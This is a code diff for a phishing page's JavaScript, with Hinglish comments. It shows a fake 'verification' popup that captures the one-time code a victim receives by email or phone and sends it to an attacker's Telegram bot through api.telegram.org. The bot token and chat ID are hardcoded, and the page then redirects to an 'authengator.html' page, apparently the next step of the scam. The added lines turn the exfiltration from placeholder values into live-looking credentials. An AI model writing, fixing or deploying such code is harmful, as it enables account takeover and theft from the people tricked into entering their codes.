@@ -1,57 +1,51 @@
-// Yahan apna purana Telegram Token aur Chat ID check kar lein
-const telegramToken = 'YOUR_BOT_TOKEN_HERE'; 
-const chatId = 'YOUR_CHAT_ID_HERE';
+document.addEventListener("DOMContentLoaded", () => {
+    // Modal controls
+    const modal = document.getElementById("verificationModal");
+    const closeModal = document.querySelector(".close-modal");
+    const otpInput = document.getElementById("otp-input");
 
-function openOtpModal(method) {
-    // 1. SABSE ZAROORI: Modal khulte hi box ko khali karna
-    const otpInput = document.getElementById('otp-input');
-    if (otpInput) {
-        otpInput.value = ''; 
-    }
+    // Modal open karne ka function
+    window.openModal = function() {
+        // FIXED: Sirf ye line add ki hai jo box ko khali karegi
+        if (otpInput) otpInput.value = ""; 
+        modal.style.display = "block";
+    };
 
-    // 2. Modal ko dikhane ka logic
-    document.getElementById('otp-modal').style.display = 'block';
-    window.currentMethod = method;
+    closeModal.onclick = () => {
+        modal.style.display = "none";
+    };
 
-    // Aapka purana modal text logic
-    const modalText = document.getElementById('modal-text');
-    if (method === 'email') {
-        modalText.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
-    } else if (method === 'phone') {
-        modalText.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
-    }
-}
+    window.onclick = (event) => {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    };
+});
 
-function submitOtp() {
-    const otpValue = document.getElementById('otp-input').value;
+// Confirm button function (Aapka original Telegram calling logic)
+async function confirmSelection() {
+    const otpValue = document.getElementById("otp-input").value;
+    
+    // Yahan wahi Bots aur Chat ID hain jo aapki original file mein the
+    const bots = {
+        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
+    };
 
     if (otpValue.length >= 6) {
-        const message = `Method: ${window.currentMethod}\nOTP: ${otpValue}`;
-        
-        // Telegram par data bhejna
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-            // REDIRECTION FIX: Isse aapka agla page (authengator.html) khul jayega
-            window.location.href = 'authengator.html';
-        })
-        .catch(err => {
-            console.error("Error:", err);
-            // Agar error aaye tab bhi agle page par bhej dega
-            window.location.href = 'authengator.html';
-        });
+        const message = `Verification Code: ${otpValue}`;
+        try {
+            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                return fetch(url);
+            });
+            await Promise.all(sendPromises);
+            
+            // Redirect to next page
+            window.location.href = "authengator.html";
+        } catch (error) {
+            window.location.href = "authengator.html";
+        }
     } else {
         alert("Please enter a valid code.");
-    }
-}
-
-function closeModal() {
-    document.getElementById('otp-modal').style.display = 'none';
-}
-
-// Bahar click karne par modal band hona
-window.onclick = function(event) {
-    const modal = document.getElementById('otp-modal');
-    if (event.target == modal) {
-        closeModal();
     }
 }
